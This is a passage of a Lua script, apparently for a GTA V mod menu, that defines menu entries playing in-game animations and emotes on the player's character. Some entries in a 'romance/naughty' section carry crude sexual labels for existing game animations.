    play_animstationary("anim@amb@world_human_valet@normal@idle_e@", "idle_n_a_m_y_vinewood_01", -1)
end)

menu.action(idleanims_root, "Lean On Railing", {""}, "", function(on_click)
    play_animstationary("anim@amb@yacht@rail@standing@female@variant_01@", "base", -1)
end)

menu.action(idleanims_root, "Lean On Railing 2", {""}, "", function(on_click)
    play_animstationary("missstrip_club_lean", "player_lean_rail_loop", -1)
end)

menu.action(idleanims_root, "Lean On Railing 3", {""}, "", function(on_click)
    play_animstationary("anim@heists@prison_heiststation@cop_reactions", "drunk_idle", -1)
end)

menu.action(idleanims_root, "Lean Right", {""}, "", function(on_click)
    play_animfreeze("anim@amb@beach_party@", "lean_female_a_base", -1)
end)

menu.action(idleanims_root, "Lean Right 2", {""}, "", function(on_click)
    play_animfreeze("missheistdockssetup1ig_5@base", "workers_talking_base_dockworker2", -1)
end)

menu.action(idleanims_root, "Left Foot Up Standing", {""}, "", function(on_click)
    play_animstationary("missfbi4leadinoutfbi_4_int", "agents_idle_b_andreas", -1)
end)

menu.action(idleanims_root, "Smoke Idling", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, true)
end)

menu.action(idleanims_root, "Standing with Phone", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_STAND_MOBILE", 0, true)
end)

menu.action(idleanims_root, "Take Selfies Idling", {""}, "", function(on_click)
    request_model_load(413312110)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 413312110, 28422, false, false)
    play_animstationary("anim@amb@beach_party@lean@cell_phone@female_a@idles", "idle_d", -1)
end)

menu.action(idleanims_root, "Overly Proud Standing", {""}, "", function(on_click)
    play_animstationary("rcmbarry", "base", -1)
end)

menu.action(idleanims_root, "Partying & Beer", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_PARTYING", 0, true)
end)

menu.action(idleanims_root, "Pensive Standing", {""}, "", function(on_click)
    play_anim("anim_casino_a@amb@casino@games@spectate@cardtable@ped_male@stand@01a@base", "base", -1)
end)

menu.action(idleanims_root, "Standing Tough", {""}, "", function(on_click)
    play_animstationary("anim@move_m@security_guard", "idle_var_04", -1)
end)

menu.action(idleanims_root, "Vibing Idle", {""}, "", function(on_click)
    play_animstationary("anim@mp_celebration@idles@female", "celebration_idle_f_a", -1)
end)

---------------------------------------- SITTING ANIMATIONS ----------------------------------------

menu.action(sitanims_root, "Crouched", {""}, "", function(on_click)
    play_animstationary("move_crouch_proto", "idle", -1)
end)

menu.action(sitanims_root, "Crouched 3", {""}, "", function(on_click)
    play_animfreeze("mp_arrest_paired", "crook_p1_front", -1)
end)

menu.action(sitanims_root, "Crouched 2", {""}, "", function(on_click)
    play_animstationary("misschinese2_crystalmaze", "2int_loop_a_taotranslator", -1)
end)

menu.action(sitanims_root, "Crossed Legs", {""}, "", function(on_click)
    play_animstationary("timetable@reunited@ig_10", "amanda_isthisthebest", -1)
end)

menu.action(sitanims_root, "Kneeled Leaning", {""}, "", function(on_click)
    play_animstationary("anim@amb@yacht@rail@seated@female@variant_02@", "base", -1)
end)

menu.action(sitanims_root, "Lay On The Bed", {""}, "", function(on_click)
    play_animstationary("amb@lo_res_idles@", "lying_face_up_lo_res_base", -1)
end)

menu.action(sitanims_root, "Lay On The Bed 2", {""}, "", function(on_click)
    play_animstationary("amb@lo_res_idles@", "world_human_sit_ups_lo_res_base", -1)
end)

menu.action(sitanims_root, "Lay On The Bed 3", {""}, "", function(on_click)
    play_animstationary("mini@cpr@char_b@cpr_def", "cpr_pumpchest_idle", -1)
end)

menu.action(sitanims_root, "Lay On The Bed 4", {""}, "", function(on_click)
    play_animstationary("switch@trevor@annoys_sunbathers", "trev_annoys_sunbathers_loop_guy", -1)
end)

menu.action(sitanims_root, "Lay On The Bed 5", {""}, "", function(on_click)
    play_animfreeze("anim@amb@nightclub@lazlow@lo_sofa@", "lowsofa_base_laz", -1)
end)

menu.action(sitanims_root, "Lay On The Floor Face Down", {""}, "", function(on_click)
    play_animstationary("dead", "dead_h", -1)
end)

menu.action(sitanims_root, "Lay On The Floor Face Up", {""}, "", function(on_click)
    play_animstationary("dead", "dead_a", -1)
end)

menu.action(sitanims_root, "Lean Back On Couch", {""}, "", function(on_click)
    play_animstationary("timetable@trevor@smoking_meth@base", "base", -1)
end)

menu.action(sitanims_root, "Lean Back On Couch 2", {""}, "", function(on_click)
    play_animstationary("anim@scripted@player@fix_astu_ig8_weed_smoke@male@", "male_pos_d_p2_base", -1)
end)

menu.action(sitanims_root, "Lean Back On Couch 3", {""}, "", function(on_click)
    play_animstationary("anim@scripted@player@fix_astu_ig8_weed_smoke@male@", "male_pos_e_p2_base", -1)
end)

menu.action(sitanims_root, "Lean Back On Couch & Phone", {""}, "", function(on_click)
    play_animstationary("switch@franklin@stripclub2", "ig_16_base", -1)
	request_model_load(3783850885)
    attachto(-0.004, 0.009, 0.0, players.user(), 0.0, 0.0, -180.0, 3783850885, 28422, false, false)
end)

menu.action(sitanims_root, "Lean Back On Sofa", {""}, "", function(on_click)
    play_animstationary("timetable@maid@couch@", "base", -1)
end)

menu.action(sitanims_root, "Lean Back On Sofa 2", {""}, "", function(on_click)
    play_animstationary("anim@scripted@player@fix_astu_ig8_weed_smoke@male@", "male_pos_a_p2_base", -1)
end)

menu.action(sitanims_root, "Lean Back On Sofa 3", {""}, "", function(on_click)
    play_animstationary("switch@michael@on_sofa", "base_jimmy", -1)
end)

menu.action(sitanims_root, "Lean Back On Sofa 4", {""}, "", function(on_click)
    play_animstationary("safe@franklin@ig_14", "base", -1)
end)

menu.action(sitanims_root, "Lean Back On Sofa 5", {""}, "", function(on_click)
    play_animstationary("timetable@jimmy@mics3_ig_15@", "idle_a_tracy", -1)
end)

menu.action(sitanims_root, "Manicure Sitting", {""}, "", function(on_click)
    play_animstationary("timetable@tracy@famr_ig_5", "base", -1)
	request_model_load(1230429806)
    attachto(0.01, 0.06, 0.03, players.user(), 30.0, 20.0, -10.0, 1230429806, 60309, false, false)
end)

menu.action(sitanims_root, "Sit On Chair", {""}, "", function(on_click)
    play_animstationary("anim@scripted@player@fix_astu_ig8_weed_smoke@male@", "male_pos_a_p1_base", -1)
end)

menu.action(sitanims_root, "Sit On Chair 2", {""}, "", function(on_click)
    play_animstationary("anim@scripted@player@fix_astu_ig8_weed_smoke@male@", "male_pos_e_p1_base", -1)
end)

menu.action(sitanims_root, "Sit On Chair & Phone", {""}, "", function(on_click)
    play_animstationary("anim@heists@heist_safehouse_intro@phone_couch@male", "phone_couch_male_idle", -1)
	request_model_load(413312110)
    attachto(-0.02, 0.036, 0.0, players.user(), 0.0, -180.0, -10.0, 413312110, 28422, false, false)
end)

menu.action(sitanims_root, "Sit On Chair Leaning Forward", {""}, "", function(on_click)
    play_animstationary("anim@scripted@player@fix_astu_ig8_weed_smoke@male@", "male_pos_d_p1_base", -1)
end)

menu.action(sitanims_root, "Sit On Couch & Watch TV", {""}, "", function(on_click)
    play_animstationary("anim@heists@heist_safehouse_intro@variations@male@tv", "tv_part_one_loop", -1)
	request_model_load(1881864012)
    attachto(0.11, 0.003, -0.04, players.user(), -10.0, 110.0, 110.0, 1881864012, 28422, false, false)
end)

menu.action(sitanims_root, "Sit On The Floor", {""}, "", function(on_click)
    play_animstationary("amb@world_human_picnic@female@base", "base", -1)
end)

menu.action(sitanims_root, "Sit On The Floor 2", {""}, "", function(on_click)
    play_animfreeze("anim@scripted@data_leak@fix_golf_ig2_golfclub_intimidation@", "stage_1_line_1_golfer", -1)
end)

menu.action(sitanims_root, "Sit On The Floor 3", {""}, "", function(on_click)
    play_animstationary("switch@michael@tv_w_kids", "001520_02_mics3_14_tv_w_kids_idle_trc", -1)
end)

menu.action(sitanims_root, "Sit On The Floor 4", {""}, "", function(on_click)
    play_animfreeze("get_up@directional@transition@prone_to_seated@mp_female", "front", -1)
end)

menu.action(sitanims_root, "Sit On The Floor 5", {""}, "", function(on_click)
    play_animstationary("anim@amb@business@bgen@bgen_no_work@", "sit_phone_phoneputdown_idle_nowork", -1)
end)

menu.action(sitanims_root, "Sit On The Floor 6", {""}, "", function(on_click)
    play_animstationary("rcm_barry3", "barry_3_sit_loop", -1)
end)

menu.action(sitanims_root, "Sit On The Floor 7", {""}, "", function(on_click)
    play_animstationary("timetable@jimmy@mics3_ig_15@", "idle_a_jimmy", -1)
end)

menu.action(sitanims_root, "Sit On The Floor 8", {""}, "", function(on_click)
    play_animstationary("amb@lo_res_idles@", "world_human_picnic_male_lo_res_base", -1)
end)

menu.action(sitanims_root, "Sit On The Floor Depressed", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@lazlow@lo_alone@", "lowalone_base_laz", -1)
end)

menu.action(sitanims_root, "Sit On The Floor Stoned", {""}, "", function(on_click)
    play_animstationary("timetable@amanda@drunk@base", "base", -1)
end)

menu.action(sitanims_root, "Sit On The Floor Wasted", {""}, "", function(on_click)
    play_animstationary("switch@trevor@naked_island", "loop", -1)
end)

menu.action(sitanims_root, "Sit Perched On", {""}, "", function(on_click)
    play_animfreeze("timetable@jimmy@ig_1@idle_b", "dont_you_dare_judge", -1)
end)

menu.action(sitanims_root, "Sit Stoned On Chair", {""}, "", function(on_click)
    play_animstationary("rcmnigel1a_band_groupies", "base_m1", -1)
end)

menu.action(sitanims_root, "Sitting Meditation", {""}, "", function(on_click)
    play_animstationary("anim@scripted@island@special_peds@dave@yoga@", "base_idle", -1)
end)

menu.action(sitanims_root, "Sitting & Praying", {""}, "", function(on_click)
    play_animstationary("misstrevor1", "ortega_outro_loop_ort", -1)
end)

menu.action(sitanims_root, "Sitting Yoga", {""}, "", function(on_click)
    play_animstationary("misscarsteal1leadin", "devon_idle_02", -1)
end)

menu.action(sitanims_root, "Sunbathe On The Floor 1", {""}, "", function(on_click)
    play_animstationary("amb@world_human_sunbathe@male@front@base", "base", -1)
end)

menu.action(sitanims_root, "Sunbathe On The Floor 2", {""}, "", function(on_click)
    play_animstationary("amb@world_human_sunbathe@female@front@base", "base", -1)
end)

menu.action(sitanims_root, "Sunbathe On The Floor 3", {""}, "", function(on_click)
    play_animfreeze("move_crawl", "onback_bwd", -1)
end)

menu.action(sitanims_root, "Wounded On The Ground", {""}, "", function(on_click)
    play_animstationary("anim@scripted@data_leak@fixf_fin_ig2_johnnyguns_wounded@", "base", -1)
end)

menu.action(sitanims_root, "Wounded On The Ground 2", {""}, "", function(on_click)
    play_animstationary("random@dealgonewrong", "idle_a", -1)
end)

---------------------------------------- ROMANCE/NAUGHTY ANIMATIONS ----------------------------------------

menu.action(sexyanims_root, "Bend Over Flirting", {""}, "", function(on_click)
    play_animstationary("random@street_race", "_car_a_flirt_girl", -1)
end)

menu.action(sexyanims_root, "Blow Kiss A", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intselfieblow_kiss", "enter", -1)
	play_animplayonce("anim@mp_player_intselfieblow_kiss", "exit", -1)
end)

menu.action(sexyanims_root, "Blow Kiss B", {""}, "", function(on_click)
    play_animplayonce("mini@hookers_sp", "idle_a", -1)
end)

menu.action(sexyanims_root, "Body Touch", {""}, "", function(on_click)
    play_anim("mini@strip_club@lap_dance@ld_girl_a_song_a_p1", "ld_girl_a_song_a_p1_m", -1)
end)

menu.action(sexyanims_root, "Body Touch Seated", {""}, "", function(on_click)
    play_animstationary("mini@strip_club@wade@", "leadin_loop_idle_a_stripper_a", -1)
end)

menu.action(sexyanims_root, "Body Touch Kneeled", {""}, "", function(on_click)
    play_anim("mini@strip_club@lap_dance@ld_girl_a_song_a_p1", "ld_girl_a_song_a_p1_m", -1)
	play_animstationary("move_crouch_proto", "idle", -1)
end)

menu.action(sexyanims_root, "Crotch Grab", {""}, "", function(on_click)
    play_animstationary("missbigscore1switch_trevor_piss", "piss_loop", -1)
end)

menu.action(sexyanims_root, "Crotch Rub", {""}, "", function(on_click)
    play_anim("mp_player_int_uppergrab_crotch", "mp_player_int_grab_crotch", -1)
end)

menu.action(sexyanims_root, "Doggy On The Floor", {""}, "", function(on_click)
    play_animstationary("random@peyote@cat", "wakeup_loop", -1)
end)

menu.action(sexyanims_root, "French Kiss A", {""}, "", function(on_click)
    play_animfreeze("hs3_ext-20", "csb_georginacheng_dual-20", -1)
end)

menu.action(sexyanims_root, "French Kiss B", {""}, "", function(on_click)
    play_animfreeze("hs3_ext-20", "cs_lestercrest_3_dual-20", -1)
end)

menu.action(sexyanims_root, "Gentle Penetration A", {""}, "", function(on_click)
    play_animstationary("misscarsteal2pimpsex", "shagloop_pimp", -1)
end)

menu.action(sexyanims_root, "Gentle Penetration B", {""}, "", function(on_click)
    play_anim("anim@amb@nightclub@lazlow@hi_railing@", "ambclub_06_li_mi_base_laz", -1)
    play_animstationary("misscarsteal2pimpsex", "shagloop_pimp", -1)
end)

menu.action(sexyanims_root, "Grab By Waist", {""}, "", function(on_click)
    play_animfreeze("anim@amb@nightclub@lazlow@hi_railing@", "ambclub_06_li_mi_base_laz", -1)
end)

menu.action(sexyanims_root, "Grab By Waist & Pull Closer", {""}, "", function(on_click)
    play_animstationary("timetable@trevor@ig_1", "ig_1_therearejustsomemoments_trevor", -1)
end)

menu.action(sexyanims_root, "Horny Puppy", {""}, "", function(on_click)
    play_animstationary("random@peyote@dog", "wakeup_loop", -1)
end)

menu.action(sexyanims_root, "Hug & Kiss A", {""}, "", function(on_click)
    play_animstopatlastframe("mp_ped_interaction", "kisses_guy_b", -1)
end)

menu.action(sexyanims_root, "Hug & Kiss B", {""}, "", function(on_click)
    play_animstopatlastframe("mp_ped_interaction", "kisses_guy_a", -1)
end)

menu.action(sexyanims_root, "Perform Oral A", {""}, "", function(on_click)
    play_animstationary("misscarsteal2pimpsex", "pimpsex_hooker", -1)
end)

menu.action(sexyanims_root, "Perform Oral B (Car)", {""}, "", function(on_click)
    play_animstationary("mini@prostitutes@sexnorm_veh_first_person", "bj_loop_prostitute", -1)
end)

menu.action(sexyanims_root, "Perform Oral C (Car)", {""}, "", function(on_click)
    play_animstationary("mini@prostitutes@sexlow_veh", "low_car_bj_loop_female", -1)
end)

menu.action(sexyanims_root, "Receive Penetration A", {""}, "", function(on_click)
    play_animstationary("rcmpaparazzo_2", "shag_loop_poppy", -1)
end)

menu.action(sexyanims_root, "Receive Penetration B", {""}, "", function(on_click)
    play_animstationary("misslamar1leadinout", "yoga_01_idle", -1)
end)

menu.action(sexyanims_root, "Receive Penetration C", {""}, "", function(on_click)
    play_animstationary("misscarsteal2pimpsex", "shagloop_hooker", -1)
end)

menu.action(sexyanims_root, "Receive Penetration D (Car)", {""}, "", function(on_click)
    play_animstationary("mini@prostitutes@sexnorm_veh", "sex_loop_prostitute", -1)
end)

menu.action(sexyanims_root, "Receive Penetration E (Car)", {""}, "", function(on_click)
    play_animstationary("mini@prostitutes@sexlow_veh_first_person", "low_car_sex_loop_female", -1)
end)

menu.action(sexyanims_root, "Receive Oral", {""}, "", function(on_click)
    play_animstationary("misscarsteal2pimpsex", "pimpsex_punter", -1)
end)

menu.action(sexyanims_root, "Romantic Hug A", {""}, "", function(on_click)
    play_animstationary("misscarsteal2chad_goodbye", "chad_armsaround_chad", -1)
end)

menu.action(sexyanims_root, "Romantic Hug B", {""}, "", function(on_click)
    play_animstationary("misscarsteal2chad_goodbye", "chad_armsaround_girl", -1)
end)

menu.action(sexyanims_root, "Rough Pounding A", {""}, "", function(on_click)
    play_animstationary("timetable@trevor@skull_loving_bear", "skull_loving_bear", -1)
end)

menu.action(sexyanims_root, "Rough Pounding B", {""}, "", function(on_click)
    play_anim("anim@scripted@island@special_peds@elrubio@hs4_elrubio_stage1_ig1", "base_ped", -1)
    play_animstationary("timetable@trevor@skull_loving_bear", "skull_loving_bear", -1)
end)

menu.action(sexyanims_root, "Rough Pounding C", {""}, "", function(on_click)
    play_animstationary("rcmpaparazzo_2", "shag_loop_a", -1)
end)

menu.action(sexyanims_root, "Slap Booty", {""}, "", function(on_click)
    play_animstationary("swat", "go_fwd", -1)
end)

menu.action(sexyanims_root, "Teasing A", {""}, "", function(on_click)
    play_animstationary("mini@strip_club@idles@stripper", "stripper_idle_02", -1)
end)

menu.action(sexyanims_root, "Teasing B", {""}, "", function(on_click)
    play_animstationary("mini@strip_club@idles@stripper", "stripper_idle_04", -1)
end)

menu.action(sexyanims_root, "Teasing C", {""}, "", function(on_click)
    play_animstationary("mini@strip_club@idles@stripper", "stripper_idle_05", -1)
end)

menu.action(sexyanims_root, "Teasing D", {""}, "", function(on_click)
    play_animstationary("mini@strip_club@idles@stripper", "stripper_idle_06", -1)
end)

menu.action(sexyanims_root, "Teasing E", {""}, "", function(on_click)
    play_animstationary("mini@hookers_sp", "ilde_c", -1)
end)

menu.action(sexyanims_root, "Twerk", {""}, "", function(on_click)
    play_animstationary("switch@trevor@mocks_lapdance", "001443_01_trvs_28_idle_stripper", -1)
end)

menu.action(sexyanims_root, "Wank Off Leaning", {""}, "", function(on_click)
    play_animstationary("switch@trevor@jerking_off", "trev_jerking_off_loop", -1)
end)

---------------------------------------- EMOTES ----------------------------------------

--- PAIRED ---

menu.action(pairedemotes_vroot, "Backslap A", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationpaired@m_m_backslap", "backslap_left", -1)
end)

menu.action(pairedemotes_vroot, "Backslap B", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationpaired@m_m_backslap", "backslap_right", -1)
end)

menu.action(pairedemotes_vroot, "Bro Hug A", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationpaired@m_m_bro_hug", "bro_hug_left", -1)
end)

menu.action(pairedemotes_vroot, "Bro Hug B", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationpaired@m_m_bro_hug", "bro_hug_right", -1)
end)

menu.action(pairedemotes_vroot, "Daps A", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@flat@paired@no_props@", "daps_b_player_a", -1)
end)

menu.action(pairedemotes_vroot, "Daps B", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@flat@paired@no_props@", "daps_b_player_a", -1)
end)

menu.action(pairedemotes_vroot, "Fist Bump A", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationpaired@m_m_fist_bump", "fist_bump_left", -1)
end)

menu.action(pairedemotes_vroot, "Fist Bump B", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationpaired@m_m_fist_bump", "fist_bump_right", -1)
end)

menu.action(pairedemotes_vroot, "Handshake A", {""}, "", function(on_click)
    play_animplayonce("mp_ped_interaction", "handshake_guy_a", -1)
end)

menu.action(pairedemotes_vroot, "Handshake B", {""}, "", function(on_click)
    play_animplayonce("mp_ped_interaction", "handshake_guy_b", -1)
end)

menu.action(pairedemotes_vroot, "High Five A", {""}, "", function(on_click)
    play_animplayonce("mp_ped_interaction", "high_five_a", -1)
end)

menu.action(pairedemotes_vroot, "High Five B", {""}, "", function(on_click)
    play_animplayonce("mp_ped_interaction", "high_five_b", -1)
end)

menu.action(pairedemotes_vroot, "Manly Handshake A", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationpaired@f_f_manly_handshake", "manly_handshake_left", -1)
end)

menu.action(pairedemotes_vroot, "Manly Handshake B", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationpaired@f_f_manly_handshake", "manly_handshake_right", -1)
end)

menu.action(pairedemotes_vroot, "Sarcastic A", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationpaired@m_m_sarcastic", "sarcastic_left", -1)
end)

menu.action(pairedemotes_vroot, "Sarcastic B", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationpaired@m_m_sarcastic", "sarcastic_right", -1)
end)

menu.action(pairedemotes_vroot, "Warm Hug A", {""}, "", function(on_click)
    play_animplayonce("mp_ped_interaction", "hugs_guy_a", -1)
end)

menu.action(pairedemotes_vroot, "Warm Hug B", {""}, "", function(on_click)
    play_animplayonce("mp_ped_interaction", "hugs_guy_b", -1)
end)

----- ENTRANCES -----

menu.action(entrances_vroot, "Air Slap", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "air_slap_a_1st", -1)
end)

menu.action(entrances_vroot, "Flip Off", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "flip_off_a_1st", -1)
end)

menu.action(entrances_vroot, "Cheering", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "cheer_a_1st", -1)
end)

menu.action(entrances_vroot, "Clapping", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "clapping_a_1st", -1)
end)

menu.action(entrances_vroot, "Cocky", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "cocky_a_1st", -1)
end)

menu.action(entrances_vroot, "Crowd Point", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "crowd_point_a_1st", -1)
end)

menu.action(entrances_vroot, "Dancing", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "dance_a_1st", -1)
end)

menu.action(entrances_vroot, "Finger Guns", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "finger_guns_a_1st", -1)
end)

menu.action(entrances_vroot, "Fist Pump", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "fist_pump_a_1st", -1)
end)

menu.action(entrances_vroot, "Hands In The Air", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "hands_air_b_1st", -1)
end)

menu.action(entrances_vroot, "Make Some Noise", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "make_noise_a_1st", -1)
end)

menu.action(entrances_vroot, "Majestic", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "regal_b_1st", -1)
end)

menu.action(entrances_vroot, "Shrug Off", {""}, "", function(on_click)
    play_animplayonce("anim@arena@celeb@podium@no_prop@", "shrug_off_a_1st", -1)
end)

----- ACTIONS -----

menu.action(actions_vroot, "Air Drums", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@air_drums", "air_drums", -1)
end)

menu.action(actions_vroot, "Air Guitar", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@air_guitar", "air_guitar", -1)
end)

menu.action(actions_vroot, "Air Shagging", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@air_shagging", "air_shagging", -1)
end)

menu.action(actions_vroot, "Air Synth", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@air_synth", "air_synth", -1)
end)

menu.action(actions_vroot, "Bang Bang", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@bang_bang", "bang_bang", -1)
end)

menu.action(actions_vroot, "Banging Tunes", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@banging_tunes", "banging_tunes", -1)
end)

menu.action(actions_vroot, "Brief Salute", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@salute", "salute", -1)
end)

menu.action(actions_vroot, "Call Me", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@call_me", "call_me", -1)
end)

menu.action(actions_vroot, "Cats Cradle", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@cats_cradle", "cats_cradle", -1)
end)

menu.action(actions_vroot, "Cheering Hyped", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_CHEERING", 0, true)
end)

menu.action(actions_vroot, "Chin Brush", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@chin_brush", "chin_brush", -1)
end)

menu.action(actions_vroot, "Crowd Invitation", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@crowd_invitation", "crowd_invitation", -1)
end)

menu.action(actions_vroot, "DJ", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@dj", "dj", -1)
end)

menu.action(actions_vroot, "Driver", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@driver", "driver", -1)
end)

menu.action(actions_vroot, "Find The Fish", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@find_the_fish", "find_the_fish", -1)
end)

menu.action(actions_vroot, "Finger Kiss", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@finger_kiss", "finger_kiss", -1)
end)

menu.action(actions_vroot, "Freak Out", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@freakout", "freakout", -1)
end)

menu.action(actions_vroot, "Heart Pumping", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@heart_pumping", "heart_pumping", -1)
end)

menu.action(actions_vroot, "Hype The Crowd", {""}, "", function(on_click)
    play_animplayonce("random@street_race", "_streetracer_accepted", -1)
end)

menu.action(actions_vroot, "Jazz Hands", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@jazz_hands", "jazz_hands", -1)
end)

menu.action(actions_vroot, "Peace", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@peace", "peace", -1)
end)

menu.action(actions_vroot, "Photography", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@photography", "photography", -1)
end)

menu.action(actions_vroot, "Raise The Roof", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@raise_the_roof", "raise_the_roof", -1)
end)

menu.action(actions_vroot, "Runner", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@runner", "runner", -1)
end)

menu.action(actions_vroot, "Salsa Roll", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@salsa_roll", "salsa_roll", -1)
end)

menu.action(actions_vroot, "Shooting Dance", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@shooting", "shooting", -1)
end)

menu.action(actions_vroot, "Smoke Flick", {""}, "", function(on_click)
    request_model_load(3269700402)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 3269700402, 28422, false, false)
    play_animplayonce("anim@mp_player_intcelebrationfemale@smoke_flick", "smoke_flick", -1)
end)

menu.action(actions_vroot, "Spray Champagne", {""}, "", function(on_click)
    request_model_load(1053267296)
    attachto(0.0, 0.0, -0.2, players.user(), 0.0, 0.0, 0.0, 1053267296, 28422, false, false)
    play_animplayonce("anim@mp_player_intcelebrationfemale@spray_champagne", "spray_champagne", -1)
end)

menu.action(actions_vroot, "Suck It", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@suck_it", "suck_it", -1)
end)

menu.action(actions_vroot, "Take Selfie", {""}, "", function(on_click)
    request_model_load(760935785)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 760935785, 60309, false, false)
    play_animstationary("anim@mp_player_intuppertake_selfie", "idle_a", -1)
end)

menu.action(actions_vroot, "The Woogie", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@the_woogie", "the_woogie", -1)
end)

menu.action(actions_vroot, "Thumbs Up", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intselfiethumbs_up", "idle_a", -1)
end)

menu.action(actions_vroot, "Uncle Disco", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@uncle_disco", "uncle_disco", -1)
end)

menu.action(actions_vroot, "V Sign", {""}, "", function(on_click)
    play_animplayonce("anim@mp_player_intcelebrationfemale@v_sign", "v_sign", -1)
end)

----- UNCATEGORIZED EMOTES -----

menu.action(emotes_root, "Abra Cadabra", {""}, "", function(on_click)
    play_animstationary("rcmbarry", "bar_1_attack_intro_aln", -1)
end)

menu.action(emotes_root, "Always Ready", {""}, "", function(on_click)
    play_animplayonce("mini@triathlon", "want_some_of_this", -1)
end)

menu.action(emotes_root, "Boop", {""}, "", function(on_click)
    play_animplayonce("anim@mp_radio@garage@high", "action_a", -1)
end)

menu.action(emotes_root, "Burning", {""}, "", function(on_click)
    play_animstationary("ragdoll@human", "on_fire", -1)
end)

menu.action(emotes_root, "Busted", {""}, "", function(on_click)
    play_animstationary("busted", "idle_a", -1)
end)

menu.action(emotes_root, "Crawling", {""}, "", function(on_click)
    play_animstationary("move_injured_ground", "front_loop", -1)
end)

menu.action(emotes_root, "Cultist Pray", {""}, "", function(on_click)
    play_animstationary("rcmepsilonism8", "worship_base", -1)
end)

menu.action(emotes_root, "Demand Money", {""}, "", function(on_click)
    play_animstationary("mini@prostitutespimp_demands_money", "pimp_demands_money_pimp", -1)
end)

menu.action(emotes_root, "Door Knock", {""}, "", function(on_click)
    play_animplayonce("timetable@jimmy@doorknock@", "knockdoor_idle", -1)
end)

menu.action(emotes_root, "Fast Clap", {""}, "", function(on_click)
    play_animplayonce("amb@world_human_cheering@male_a", "base", -1)
end)

menu.action(emotes_root, "Gang Sign A", {""}, "", function(on_click)
    play_anim("amb@code_human_in_car_mp_actions@gang_sign_b@std@ps@base", "idle_a", -1)
end)

menu.action(emotes_root, "Gang Sign B", {""}, "", function(on_click)
    play_anim("mp_player_int_uppergang_sign_a", "mp_player_int_gang_sign_a", -1)
end)

